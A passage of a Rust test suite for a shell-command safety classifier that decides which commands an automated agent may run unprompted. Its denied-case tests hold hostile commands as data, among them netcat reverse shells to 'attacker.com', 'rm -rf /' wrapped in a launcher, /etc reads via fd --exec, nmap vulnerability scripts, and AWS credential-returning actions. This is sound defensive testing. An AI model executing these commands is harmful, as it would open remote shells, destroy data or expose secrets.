        assert!(failures.is_empty(), "TOML commands accepted unknown flags:\n{}", failures.join("\n"));
    }

    /// Data-defined spec: every TOML can declare `examples_safe` and
    /// `examples_denied` strings that exercise canonical and alias
    /// invocations. This test runs each through `is_safe_command` and
    /// flags any drift between the TOML and the runtime dispatcher.
    /// Use to lock in alias correctness, security boundaries, and
    /// representative agent invocations.
    #[test]
    fn toml_examples_match_dispatch() {
        let mut failures = Vec::new();
        for (name, spec) in TOML_REGISTRY.iter() {
            // Skip alias entries — examples live on the canonical spec only.
            if name != &spec.name {
                continue;
            }
            for ex in &spec.examples_safe {
                if !crate::is_safe_command(ex) {
                    failures.push(format!("{}: examples_safe rejected: {ex:?}", spec.name));
                }
            }
            for ex in &spec.examples_denied {
                if crate::is_safe_command(ex) {
                    failures.push(format!("{}: examples_denied accepted: {ex:?}", spec.name));
                }
            }
        }
        assert!(failures.is_empty(),
            "TOML examples drift from dispatcher:\n{}", failures.join("\n"));
    }

    /// GLOBAL guard for the `verb-chain` primitive — enumerated over the registry so any future
    /// verb-chain command is covered automatically, not just mlr. For every such command:
    ///   1. every allowlisted verb classifies safe (bare, and after the `then` separator);
    ///   2. a non-allowlisted verb denies (bare, and after the separator) — the fail-closed rule
    ///      that keeps `put`/`filter`/`split`/`tee` and any unknown/newer verb out;
    ///   3. an UNKNOWN main flag denies at EVERY position in the main region. This is the
    ///      generalized form of the `mlr --from data.csv -I cat` in-place hole: the strict
    ///      allowlist catches ANY unlisted main flag (a future mutating flag included), wherever
    ///      it sits, with no hand-maintained denylist.
    #[test]
    fn verb_chain_grammar_is_enforced_across_the_registry() {
        const BOGUS_VERB: &str = "sc-nonexistent-verb-zzz";
        const BOGUS_FLAG: &str = "--sc-nonexistent-main-flag-zzz";
        let mut checked = 0;
        for (name, spec) in TOML_REGISTRY.iter() {
            if name != &spec.name {
                continue; // canonical only
            }
            let DispatchKind::VerbChain(vc) = &spec.kind else {
                continue;
            };
            checked += 1;
            let cmd = &spec.name;
            let sep = &vc.separator;
            let first = vc.verbs.iter().next().expect("a verb-chain command declares ≥1 verb");

            for verb in &vc.verbs {
                assert!(crate::is_safe_command(&format!("{cmd} {verb}")),
                    "{cmd}: allowlisted verb `{verb}` denied");
                assert!(crate::is_safe_command(&format!("{cmd} {first} {sep} {verb}")),
                    "{cmd}: allowlisted verb `{verb}` denied after `{sep}`");
            }

            assert!(!crate::is_safe_command(&format!("{cmd} {BOGUS_VERB}")),
                "{cmd}: non-allowlisted verb allowed (bare)");
            assert!(!crate::is_safe_command(&format!("{cmd} {first} {sep} {BOGUS_VERB}")),
                "{cmd}: non-allowlisted verb allowed after `{sep}`");

            let real: Vec<&str> = vc.main_standalone.iter().take(3).map(String::as_str).collect();
            for at in 0..=real.len() {
                let mut main = real.clone();
                main.insert(at, BOGUS_FLAG);
                let line = format!("{cmd} {} {first}", main.join(" "));
                assert!(!crate::is_safe_command(&line),
                    "{cmd}: unknown main flag allowed at position {at}: `{line}`");
            }
        }
        assert!(checked >= 1, "no verb-chain commands exercised — vacuous guard");
    }

    /// Regression guard: `examples_safe`/`examples_denied` must appear
    /// before any `[[command.sub]]` or `[command.fallback]` table in
    /// each TOML file. TOML semantics scope inline keys to the
    /// most-recently-opened table, so examples written *after* a
    /// nested table silently get attached to that table and dropped
    /// from the command. Walks every `commands/**/*.toml` and asserts
    /// each `[[command]]` block that mentions an `examples_*` field
    /// produces a non-empty list on the parsed spec.
    #[test]
    fn examples_appear_before_nested_tables_in_every_toml() {
        use std::fs;
        use std::path::PathBuf;

        fn walk(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
            for entry in fs::read_dir(dir).unwrap() {
                let entry = entry.unwrap();
                let path = entry.path();
                if path.is_dir() {
                    walk(&path, out);
                } else if path.extension().and_then(|e| e.to_str()) == Some("toml") {
                    if path.file_name().and_then(|n| n.to_str()) == Some("SAMPLE.toml") {
                        continue;
                    }
                    out.push(path);
                }
            }
        }

        let mut files = Vec::new();
        walk(std::path::Path::new("commands"), &mut files);
        assert!(!files.is_empty(), "expected commands/ to contain TOML files");

        let mut failures = Vec::new();
        for path in files {
            let source = fs::read_to_string(&path).unwrap();
            let parsed: toml::Value = match toml::from_str(&source) {
                Ok(v) => v,
                Err(e) => {
                    failures.push(format!("{}: parse error: {e}", path.display()));
                    continue;
                }
            };
            let Some(cmds) = parsed.get("command").and_then(|v| v.as_array()) else {
                continue;
            };
            for cmd in cmds {
                let Some(name) = cmd.get("name").and_then(|v| v.as_str()) else {
                    continue;
                };
                if source.contains("examples_safe")
                    && cmd.get("examples_safe").is_none()
                {
                    failures.push(format!(
                        "{}: command `{name}` — `examples_safe` text in file but \
                         not attached to [[command]] (move it above any \
                         [[command.sub]] / [command.fallback] table)",
                        path.display(),
                    ));
                }
                if source.contains("examples_denied")
                    && cmd.get("examples_denied").is_none()
                {
                    failures.push(format!(
                        "{}: command `{name}` — `examples_denied` text in file \
                         but not attached to [[command]] (move it above any \
                         [[command.sub]] / [command.fallback] table)",
                        path.display(),
                    ));
                }
            }
        }
        assert!(
            failures.is_empty(),
            "TOML examples misordered:\n{}",
            failures.join("\n"),
        );
    }

    #[test]
    fn handler_with_subs_and_fallback_builds_custom_kind() {
        // Verify that a handler-using TOML carries its [[command.sub]]
        // and [command.fallback] data through into DispatchKind::Custom.
        // Without this, try_sub_dispatch / try_fallback_grammar would
        // see empty data and silently deny everything the handler asks
        // about.
        let spec = load_one(r#"
[[command]]
name = "demo-handler"
handler = "demo"

[[command.sub]]
name = "diag"
max_positional = 0

[command.fallback]
level = "Inert"
bare = true
max_positional = 1
positional_shape = "path"
standalone = ["--help", "-h"]
"#);
        match &spec.kind {
            DispatchKind::Custom { handler_name, subs, fallback, .. } => {
                assert_eq!(handler_name, "demo");
                let names: Vec<_> = subs.iter().map(|s| s.name.as_str()).collect();
                assert_eq!(names, vec!["diag"]);
                let f = fallback.as_ref().expect("fallback present");
                assert_eq!(f.level, SafetyLevel::Inert);
                assert_eq!(f.policy.max_positional, Some(1));
                assert_eq!(
                    f.positional_shape,
                    Some(crate::policy::PositionalShape::Path),
                );
            }
            other => panic!("expected Custom, got {other:?}"),
        }
    }

    #[test]
    fn sub_policy_ref_resolves_to_handler_policy() {
        // `policy = "key"` on a [[command.sub]] block copies the
        // referenced handler_policy into the sub's effective flag
        // policy at build time. Lets a single-sub form re-use a matrix
        // entry's flag list without duplication.
        let spec = load_one(r#"
[[command]]
name = "demo-policy-ref"
handler = "demo_handler"

[command.handler_policy.shared]
bare = false
standalone = ["--help", "--web", "-h", "-w"]
valued = ["--repo"]

[[command.sub]]
name = "browse"
policy = "shared"
guard = "--no-browser"
guard_short = "-n"
level = "Inert"

[[command.sub]]
name = "search"
policy = "shared"
level = "Inert"
"#);
        match &spec.kind {
            DispatchKind::Custom { subs, .. } => {
                let browse = subs.iter().find(|s| s.name == "browse").unwrap();
                match &browse.kind {
                    DispatchKind::RequireAny { policy, require_any, .. } => {
                        assert!(policy.standalone.iter().any(|f| f == "--web"));
                        assert!(policy.valued.iter().any(|f| f == "--repo"));
                        assert!(require_any.iter().any(|f| f == "--no-browser"));
                        assert!(require_any.iter().any(|f| f == "-n"));
                    }
                    other => panic!("expected RequireAny (guard sets it), got {other:?}"),
                }
                let search = subs.iter().find(|s| s.name == "search").unwrap();
                match &search.kind {
                    DispatchKind::Policy { policy, .. } => {
                        assert!(policy.standalone.iter().any(|f| f == "--web"));
                        assert!(policy.valued.iter().any(|f| f == "--repo"));
                    }
                    other => panic!("expected Policy, got {other:?}"),
                }
            }
            other => panic!("expected Custom, got {other:?}"),
        }
    }

    #[test]
    fn sub_policy_ref_unknown_key_panics() {
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
[[command]]
name = "demo-bad-ref"
handler = "demo_handler"

[command.handler_policy.real]
bare = true

[[command.sub]]
name = "browse"
policy = "rael"
"#);
        });
        assert!(
            result.is_err(),
            "[[command.sub]] policy referencing an unknown handler_policy must panic",
        );
    }

    #[test]
    fn sub_policy_ref_with_inline_lists_panics() {
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
[[command]]
name = "demo-dup-ref"
handler = "demo_handler"

[command.handler_policy.shared]
bare = true
standalone = ["--help"]

[[command.sub]]
name = "browse"
policy = "shared"
standalone = ["--extra"]
"#);
        });
        assert!(
            result.is_err(),
            "mixing `policy` ref with inline standalone/valued must panic",
        );
    }

    #[test]
    fn matrix_referencing_unknown_policy_panics() {
        // Silent-deny would otherwise hide typos: a matrix entry whose
        // policy_key doesn't match any [command.handler_policy.*] would
        // dispatch to "policy not found → Denied," masking the typo.
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
[[command]]
name = "demo-bad-matrix"
handler = "demo_handler"

[command.handler_policy.real]
bare = true
standalone = ["--help"]

[[command.matrix]]
parents = ["alpha"]
level = "Inert"
[command.matrix.actions]
list = "rael"
"#);
        });
        assert!(
            result.is_err(),
            "matrix referencing an unknown handler_policy must panic at build time",
        );
    }

    #[test]
    fn matrix_with_duplicate_parent_action_panics() {
        // Latent ordering footgun: if two matrices both contain the
        // same (parent, action), only the first match wins. Panicking
        // at build forces the author to consolidate.
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
[[command]]
name = "demo-dup-matrix"
handler = "demo_handler"

[command.handler_policy.a]
bare = true
[command.handler_policy.b]
bare = true

[[command.matrix]]
parents = ["alpha"]
level = "Inert"
[command.matrix.actions]
list = "a"

[[command.matrix]]
parents = ["alpha"]
level = "SafeWrite"
[command.matrix.actions]
list = "b"
"#);
        });
        assert!(
            result.is_err(),
            "duplicate (parent, action) across matrices must panic at build time",
        );
    }

    #[test]
    fn fallback_without_handler_panics() {
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
[[command]]
name = "demo-orphan-fallback"
bare = true

[command.fallback]
level = "Inert"
bare = true
"#);
        });
        assert!(
            result.is_err(),
            "fallback declared without a handler should panic — \
             try_fallback_grammar is only invoked from handlers, so the \
             block is dead config",
        );
    }

    #[test]
    fn unknown_positional_shape_panics() {
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
[[command]]
name = "demo-bad-shape"
handler = "demo"

[command.fallback]
level = "Inert"
positional_shape = "not-a-real-shape"
"#);
        });
        assert!(
            result.is_err(),
            "loading an unknown positional_shape should panic with diagnostic",
        );
    }

    #[test]
    fn handler_without_fallback_field_has_none() {
        // Regression: a handler-using TOML with no [command.fallback]
        // block must produce `fallback: None` so try_fallback_grammar
        // returns None and the handler can deny.
        let spec = load_one(r#"
[[command]]
name = "demo-no-fallback"
handler = "demo"
"#);
        match &spec.kind {
            DispatchKind::Custom { subs, fallback, .. } => {
                assert!(subs.is_empty());
                assert!(fallback.is_none());
            }
            other => panic!("expected Custom, got {other:?}"),
        }
    }

    #[test]
    fn deny_field_denies_every_invocation() {
        let source = r#"
[[command]]
name = "demo-deny"
deny = true
"#;
        let specs = load_toml(source, "test");
        let map = build_registry(specs);
        let spec = map.get("demo-deny").expect("demo-deny in registry");
        for case in ["demo-deny", "demo-deny --help", "demo-deny foo bar", "demo-deny -x"] {
            let parsed = toks(&case.split_whitespace().collect::<Vec<_>>());
            assert_eq!(
                dispatch_spec(&parsed, spec),
                Verdict::Denied,
                "expected denied: {case}",
            );
        }
    }

    #[test]
    fn insert_spec_replaces_aliases() {
        let original = load_toml(r#"
[[command]]
name = "original-tool"
aliases = ["o", "orig"]
url = "x"
description = "first"
bare_flags = ["--help"]
"#, "test");
        let mut map = build_registry(original);
        assert!(map.contains_key("o"));
        assert!(map.contains_key("orig"));

        let override_spec = load_toml(r#"
[[command]]
name = "original-tool"
deny = true
"#, "test").into_iter().next().unwrap();
        super::build::insert_spec(&mut map, override_spec);

        assert!(!map.contains_key("o"), "stale alias 'o' must be removed");
        assert!(!map.contains_key("orig"), "stale alias 'orig' must be removed");
        let spec = &map["original-tool"];
        let parsed = toks(&["original-tool", "--help"]);
        assert_eq!(dispatch_spec(&parsed, spec), Verdict::Denied);
    }

    #[test]
    fn toml_hash_commands_work() {
        assert!(crate::is_safe_command("md5sum file.txt"));
        assert!(crate::is_safe_command("sha256sum file.txt"));
        assert!(crate::is_safe_command("b2sum file.txt"));
        assert!(crate::is_safe_command("shasum -a 256 file.txt"));
        assert!(crate::is_safe_command("cksum file.txt"));
        assert!(crate::is_safe_command("md5 file.txt"));
        assert!(crate::is_safe_command("sum file.txt"));
        assert!(crate::is_safe_command("md5sum --check checksums.md5"));
    }

    #[test]
    fn toml_hash_commands_reject_unknown() {
        assert!(!crate::is_safe_command("md5sum --evil"));
        assert!(!crate::is_safe_command("sha256sum --evil"));
        assert!(!crate::is_safe_command("b2sum --evil"));
    }

    #[test]
    fn toml_fd_allowed() {
        assert!(crate::is_safe_command("fd pattern"));
        assert!(crate::is_safe_command("fd -H pattern"));
        assert!(crate::is_safe_command("fd -t f pattern"));
        assert!(crate::is_safe_command("fd -e rs pattern"));
        assert!(crate::is_safe_command("fd -g '*.rs'"));
        assert!(crate::is_safe_command("fd -L pattern"));
        assert!(crate::is_safe_command("fd -a pattern"));
        assert!(crate::is_safe_command("fd --color auto pattern"));
        assert!(crate::is_safe_command("fd --max-depth 3 pattern"));
    }

    #[test]
    fn toml_fd_denied() {
        // -x/--exec now DELEGATE to the inner command (like `find -exec`), so danger tracks the inner
        // command's locus: an exec into a SYSTEM search path denies through the delegated verdict.
        assert!(!crate::is_safe_command("fd /etc --exec cat {}"));
        assert!(!crate::is_safe_command("fd /etc -x od {}"));
        assert!(!crate::is_safe_command("fd /etc -X cat"));
        assert!(!crate::is_safe_command("fd -x cat /etc/{}"));
        // A clustered short flag that isn't a real fd flag (`-xH`/`-HX`) is not the exec flag — it
        // fails the flag grammar and denies.
        assert!(!crate::is_safe_command("fd -xH pattern"));
        assert!(!crate::is_safe_command("fd -HX pattern"));
        // Unknown search flag, and a dangling exec with no command.
        assert!(!crate::is_safe_command("fd --evil"));
        assert!(!crate::is_safe_command("fd -x"));
    }

    #[test]
    fn toml_kafka_topics_allowed() {
        assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --list"));
        assert!(crate::is_safe_command("kafka-topics --list --bootstrap-server localhost:9092"));
        assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --describe --topic foo"));
        assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --describe --under-replicated-partitions"));
        assert!(crate::is_safe_command("kafka-topics --help"));
    }

    #[test]
    fn toml_kafka_topics_denied() {
        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --delete --topic foo"));
        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --create --topic foo"));
        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --alter --topic foo"));
        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --list --create"));
        assert!(!crate::is_safe_command("kafka-topics"));
    }

    #[test]
    fn toml_kafka_consumer_groups_allowed() {
        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --list"));
        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --group mbc --describe"));
        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --describe --group mbc"));
        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --describe --all-groups"));
    }

    #[test]
    fn toml_kafka_consumer_groups_denied() {
        assert!(!crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --reset-offsets"));
        assert!(!crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --delete"));
        assert!(!crate::is_safe_command("kafka-consumer-groups"));
    }

    #[test]
    fn toml_kafka_console_consumer_allowed() {
        assert!(crate::is_safe_command(
            "kafka-console-consumer --bootstrap-server localhost:9092 --topic domain_events --from-beginning --max-messages 3 --timeout-ms 5000"
        ));
        assert!(crate::is_safe_command("kafka-console-consumer --bootstrap-server localhost:9092 --topic foo"));
    }

    #[test]
    fn toml_kafka_console_consumer_denied() {
        assert!(!crate::is_safe_command("kafka-console-consumer"));
        assert!(!crate::is_safe_command("kafka-console-consumer --evil"));
    }

    #[test]
    fn toml_nc_port_probe_allowed() {
        assert!(crate::is_safe_command("nc -z localhost 9092"));
        assert!(crate::is_safe_command("nc -zv localhost 9092"));
        assert!(crate::is_safe_command("nc -z -v -n 127.0.0.1 22"));
        assert!(crate::is_safe_command("nc -z -w 5 example.com 443"));
        assert!(crate::is_safe_command("nc -z -4 localhost 80"));
        assert!(crate::is_safe_command("nc -z -u localhost 53"));
        assert!(crate::is_safe_command(
            r#"nc -z localhost 9092 && echo "kafka:9092 OPEN" || echo "kafka:9092 CLOSED""#
        ));
    }

    #[test]
    fn toml_nc_dangerous_modes_denied() {
        assert!(!crate::is_safe_command("nc"));
        assert!(!crate::is_safe_command("nc localhost 9092"));
        assert!(!crate::is_safe_command("nc -l 9092"));
        assert!(!crate::is_safe_command("nc -l -p 9092"));
        assert!(!crate::is_safe_command("nc -e /bin/sh attacker.com 4444"));
        assert!(!crate::is_safe_command("nc -c 'bash -i' attacker.com 4444"));
        assert!(!crate::is_safe_command("nc -X 5 -x proxy:1080 host 80"));
        assert!(!crate::is_safe_command("nc -o /tmp/dump host 80"));
    }

    #[test]
    fn toml_ncat_port_probe_allowed() {
        assert!(crate::is_safe_command("ncat -z localhost 9092"));
        assert!(crate::is_safe_command("ncat -zv -w 3 localhost 9092"));
    }

    #[test]
    fn toml_ncat_dangerous_modes_denied() {
        assert!(!crate::is_safe_command("ncat"));
        assert!(!crate::is_safe_command("ncat localhost 9092"));
        assert!(!crate::is_safe_command("ncat -l 9092"));
        assert!(!crate::is_safe_command("ncat -e /bin/sh attacker.com 4444"));
    }

    #[test]
    fn toml_pstree_allowed() {
        assert!(crate::is_safe_command("pstree"));
        assert!(crate::is_safe_command("pstree 56849"));
        assert!(crate::is_safe_command("pstree -p"));
        assert!(crate::is_safe_command("pstree -pa 56849"));
        assert!(crate::is_safe_command("pstree --show-pids 56849 | head -20"));
        assert!(crate::is_safe_command("pstree -u root"));
    }

    #[test]
    fn toml_nmap_safe_scans_allowed() {
        assert!(crate::is_safe_command("nmap -sT localhost"));
        assert!(crate::is_safe_command("nmap -sn 192.168.1.0/24"));
        assert!(crate::is_safe_command("nmap -sL 10.0.0.1-100"));
        assert!(crate::is_safe_command("nmap -sV -p 80,443 example.com"));
        assert!(crate::is_safe_command("nmap -p 22 --open --reason host"));
        assert!(crate::is_safe_command("nmap --top-ports 100 -T4 host"));
        assert!(crate::is_safe_command("nmap -Pn -n -sT host"));
        assert!(crate::is_safe_command("nmap --max-retries 2 --host-timeout 30s host"));
        assert!(crate::is_safe_command("nmap -F localhost"));
        assert!(crate::is_safe_command("nmap --version"));
        assert!(crate::is_safe_command("nmap -V"));
    }

    #[test]
    fn toml_nmap_dangerous_modes_denied() {
        assert!(!crate::is_safe_command("nmap"));
        assert!(!crate::is_safe_command("nmap --script vuln host"));
        assert!(!crate::is_safe_command("nmap --script=http-shellshock host"));
        assert!(!crate::is_safe_command("nmap --script-args user=admin host"));
        assert!(!crate::is_safe_command("nmap -A host"));
        assert!(!crate::is_safe_command("nmap -O host"));
        assert!(!crate::is_safe_command("nmap -sU host"));
        assert!(!crate::is_safe_command("nmap -sS host"));
        assert!(!crate::is_safe_command("nmap -sF host"));
        assert!(!crate::is_safe_command("nmap -iL targets.txt"));
        assert!(!crate::is_safe_command("nmap -oN out.txt host"));
        assert!(!crate::is_safe_command("nmap -oA scan host"));
        assert!(!crate::is_safe_command("nmap --data-string EVIL host"));
        assert!(!crate::is_safe_command("nmap --scanflags SYNFIN host"));
        assert!(!crate::is_safe_command("nmap --privileged host"));
        assert!(!crate::is_safe_command("nmap --resume scan.gnmap"));
        assert!(!crate::is_safe_command("nmap --script-updatedb"));
    }

    #[test]
    fn toml_monolith_allowed() {
        assert!(crate::is_safe_command("monolith https://example.com"));
        assert!(crate::is_safe_command("monolith -j -i https://example.com"));
        assert!(crate::is_safe_command("monolith --no-audio --no-video https://example.com"));
        assert!(crate::is_safe_command("monolith -C /tmp/cookies.txt https://example.com"));
        assert!(crate::is_safe_command("monolith -u 'Mozilla/5.0' https://example.com"));
        assert!(crate::is_safe_command("monolith --timeout 30 https://example.com"));
        assert!(crate::is_safe_command("monolith https://example.com > /dev/null"));
    }

    #[test]
    fn toml_monolith_denied() {
        assert!(!crate::is_safe_command("monolith"));
        assert!(!crate::is_safe_command("monolith https://example.com -o /tmp/out.html"));
        assert!(!crate::is_safe_command("monolith -o - https://example.com"));
        assert!(!crate::is_safe_command("monolith --unknown https://example.com"));
    }

    #[test]
    fn toml_jai_allowed() {
        assert!(crate::is_safe_command("jai cat /tmp/foo"));
        assert!(crate::is_safe_command("jai grep pattern /tmp/foo"));
        assert!(crate::is_safe_command("jai --casual rg pattern src/"));
        assert!(crate::is_safe_command("jai --strict sleep 1"));
        assert!(crate::is_safe_command("jai claude plugin info foo"));
    }

    #[test]
    fn toml_jai_denied() {
        assert!(!crate::is_safe_command("jai rm -rf /"));
        assert!(!crate::is_safe_command("jai"));
        assert!(!crate::is_safe_command("jai bash"));
        assert!(!crate::is_safe_command("jai --unknown-flag cat /tmp/x"));
        assert!(!crate::is_safe_command("jai --casual bash -c 'rm -rf /'"));
        assert!(!crate::is_safe_command("jai -- rm -rf /"));
    }

    #[test]
    fn toml_claude_plugin_info_allowed() {
        assert!(crate::is_safe_command("claude plugin info mbc@mbc-plugins"));
        assert!(crate::is_safe_command("claude plugins info mbc@mbc-plugins"));
    }

    #[test]
    fn toml_plutil_convert_allowed() {
        assert!(crate::is_safe_command("plutil -convert xml1 -o - /tmp/foo.plist"));
        assert!(crate::is_safe_command("plutil -convert binary1 -o - /tmp/foo.plist"));
        assert!(crate::is_safe_command("plutil -convert json -r -o - /tmp/foo.plist"));
        assert!(crate::is_safe_command("plutil -convert xml1 -o -"));
    }

    #[test]
    fn toml_plutil_convert_denied() {
        assert!(!crate::is_safe_command("plutil -convert invalid -o - /tmp/in"));
        assert!(!crate::is_safe_command("plutil -convert xml1 -e plist -o - /tmp/in"));
    }

    fn check_toml_unknown(prefix: &str, kind: &DispatchKind, failures: &mut Vec<String>) {
        match kind {
            DispatchKind::Branching { subs, .. } => {
                for sub in subs {
                    // A PROFILED sub is engine-classified by its archetype and ignores its flags on
                    // the engine path (its legacy kind is deny-all) — so the blanket "unknown flag
                    // fails closed" net does not apply. A flag that changes the classification
                    // (a read→write flag) is declared explicitly via `[[command.sub.flag]]`
                    // escalation, and caught by the adversarial review, not this net. Same principle
                    // as the corpus gate's profiled-sub skip.
                    if sub.profile.is_some() {
                        continue;
                    }
                    check_toml_unknown(&format!("{prefix} {}", sub.name), &sub.kind, failures);
                }
            }
            DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. }
                if !policy.tolerance.unknown.allows_long() =>
            {
                let test = format!("{prefix} --xyzzy-unknown-42");
                if crate::is_safe_command(&test) {
                    failures.push(format!("{prefix}: accepted unknown flag"));
                }
            }
            DispatchKind::WriteFlagged { policy, .. } if !policy.tolerance.unknown.allows_long() => {
                let test = format!("{prefix} --xyzzy-unknown-42");
                if crate::is_safe_command(&test) {
                    failures.push(format!("{prefix}: accepted unknown flag"));
                }
            }
            _ => {}
        }
    }

    #[test]
    fn toml_specs_reject_unknown() {
        let mut failures = Vec::new();
        for (name, spec) in super::TOML_REGISTRY.iter() {
            if name != &spec.name { continue; }
            // See `toml_registry_rejects_unknown_flags`: grep owns its flag semantics.
            if is_grep_hook(spec) {
                continue;
            }
            check_toml_unknown(&spec.name, &spec.kind, &mut failures);
        }
        assert!(failures.is_empty(), "TOML specs accepted unknown flags:\n{}", failures.join("\n"));
    }

    fn collect_strict_paths() -> Vec<String> {
        let mut paths = Vec::new();
        for (name, spec) in super::TOML_REGISTRY.iter() {
            if name != &spec.name { continue; }
            // grep's hook treats an unrecognized `--token` as a search PATTERN (read-only), so it
            // does not reject random flags — the same exemption the deny-unknown sweeps make.
            if is_grep_hook(spec) {
                continue;
            }
            collect_strict_inner(&spec.name, &spec.kind, &mut paths);
        }
        paths
    }

    fn collect_strict_inner(prefix: &str, kind: &DispatchKind, paths: &mut Vec<String>) {
        match kind {
            DispatchKind::Branching { subs, .. } => {
                for sub in subs {
                    // A PROFILED sub is engine-classified by its archetype (auto-approves, its legacy
                    // kind is deny-all) — its strict flag policy is never the live contract, so the
                    // random-flag fuzz does not apply. A flag that changes the classification is
                    // declared via `[[command.sub.flag]]` / `output_path_flags` and caught by the
                    // adversarial review. Same exemption as `check_toml_unknown` above.
                    if sub.profile.is_some() {
                        continue;
                    }
                    collect_strict_inner(&format!("{prefix} {}", sub.name), &sub.kind, paths);
                }
            }
            DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. }
                if !policy.tolerance.unknown.allows_long() =>
            {
                paths.push(prefix.to_string());
            }
            DispatchKind::WriteFlagged { policy, .. } if !policy.tolerance.unknown.allows_long() => {
                paths.push(prefix.to_string());
            }
            _ => {}
        }
    }

    proptest::proptest! {
        #[test]
        fn toml_strict_reject_random_flags(
            seed in 0..1000usize,
            suffix in "[a-z]{5,10}"
        ) {
            let paths = collect_strict_paths();
            if paths.is_empty() { return Ok(()); }
            let path = &paths[seed % paths.len()];
            let test = format!("{path} --xyzzy-{suffix}");
            proptest::prop_assert!(!crate::is_safe_command(&test),
                "accepted random flag: {test}");
        }
    }

    /// The invariant behind the AWS credential-glob carve-out batch (2026-07): a service that
    /// auto-approves read verbs via a `first_arg` glob but carves specific dangerous actions out to
    /// profiled sub-subs must (a) DENY every credential-/blob-profile carve-out, (b) still ALLOW the
    /// base form of a `remote-read` carve-out (the flag-conditional ones), and (c) keep AUTO-APPROVING
    /// a benign glob-sibling. Walks the real registry, so every AWS service with this shape — and any
    /// future one — is covered automatically, not a hand-picked list. Guards against a carve-out that
    /// silently fails to deny, and against a carve-out accidentally killing its service's glob.
    #[test]
    fn glob_carveouts_deny_while_the_glob_still_allows_siblings() {
        use super::types::DispatchKind;
        let Some(spec) = TOML_REGISTRY.get("aws") else { return };
        let DispatchKind::Branching { subs: services, .. } = &spec.kind else {
            panic!("aws is not Branching");
        };
        let mut deny_checks = 0;
        let mut allow_checks = 0;
        for svc in services {
            let DispatchKind::Branching { subs: actions, first_arg, .. } = &svc.kind else { continue };
            if first_arg.is_empty() || actions.is_empty() {
                continue; // only the glob-plus-carve-out services
            }
            // (c) a benign action matching the glob is untouched by the carve-outs.
            let prefix = first_arg[0].trim_end_matches('*');
            let benign = format!("aws {} {prefix}zzz-benign-nonexistent", svc.name);
            assert!(crate::is_safe_command(&benign), "carve-out killed the glob: `{benign}`");
            allow_checks += 1;
            for act in actions {
                let Some(profile) = &act.profile else { continue };
                let cmd = format!("aws {} {}", svc.name, act.name);
                if profile.starts_with("credential-") || profile == "bulk-object-read" {
                    // (a) a deny-tier carve-out must not auto-approve, in any form.
                    assert!(!crate::is_safe_command(&cmd), "carve-out must deny: `{cmd}` (profile={profile})");
                    deny_checks += 1;
                } else if profile == "remote-read" {
                    // (b) a flag-conditional carve-out's BASE read still auto-approves.
                    assert!(crate::is_safe_command(&cmd), "base read must allow: `{cmd}`");
                    allow_checks += 1;
                }
            }
        }
        // Non-vacuity: the AWS batch is substantial — a regression that drops the carve-outs entirely
        // would sink these counts.
        assert!(deny_checks >= 70, "expected the AWS carve-out batch covered; deny_checks={deny_checks}");
        assert!(allow_checks >= 40, "expected glob-siblings covered; allow_checks={allow_checks}");
    }

    /// Deterministic residue guard for the AWS credential-glob class (the user's "write a test to flush
    /// it out"). The fixture is every read-verb AWS action whose NAME smells of credentials/secrets/
    /// tokens, extracted from the bundled botocore models. Invariant: each must DENY (carved out) or
    /// appear in GRANDFATHER with a reason it is benign (returns only metadata / a public value / a
    /// policy — verified against the botocore output shape). A NEW credential-returning action that
    /// auto-approves is neither → the test fails and forces triage. This flushed `ssm get-access-token`
    /// and `lakeformation get-temporary-data-location-credentials` that the LLM sweep missed. GRANDFATHER
    /// shrinks only. Refresh the fixture when re-researching AWS (see RESEARCH-PLAN.md).
    #[test]
    fn aws_credential_smell_actions_deny_or_are_grandfathered() {
        // (service, action, why-benign) — each verified to return NO usable secret value.
        const GRANDFATHER: &[(&str, &str, &str)] = &[
            ("apigateway", "get-api-key", "flag-conditional: base is metadata; the key VALUE needs --include-value, gated separately"),
            ("apigateway", "get-api-keys", "flag-conditional: base is metadata; values need --include-values, gated separately"),
            ("chime-sdk-voice", "list-voice-connector-termination-credentials", "output is Usernames only; passwords are write-only"),
            ("codebuild", "list-source-credentials", "SourceCredentialsInfo (arn/type/authType); no token value"),
            ("codecatalyst", "list-access-tokens", "PAT metadata (id/name/expiry); token value shown only at creation"),
            ("cognito-idp", "list-user-pool-client-secrets", "doc: 'the response never reveals the actual secret' — metadata only"),
            ("cognito-idp", "list-web-authn-credentials", "WebAuthn public-key credentials (public keys / IDs), not secrets"),
            ("iam", "get-account-password-policy", "the account password POLICY (length/complexity), not any password"),
            ("iam", "get-login-profile", "console-login metadata (exists/create-date/reset), not the password"),
            ("iam", "get-open-id-connect-provider", "OIDC provider config (url/client-ids/public thumbprints)"),
            ("iam", "list-open-id-connect-provider-tags", "tags on an OIDC provider"),
            ("iam", "list-open-id-connect-providers", "OIDC provider ARNs"),
            ("iam", "list-service-specific-credentials", "credential metadata (id/username/status); password shown only at creation"),
            ("ivs", "list-stream-keys", "stream-key ARN summaries; the value is in get-stream-key (denied)"),
            ("kafka", "list-scram-secrets", "Secrets Manager ARNs associated to the cluster, not the values"),
            ("secretsmanager", "describe-secret", "secret metadata (name/rotation/ARN), not the value"),
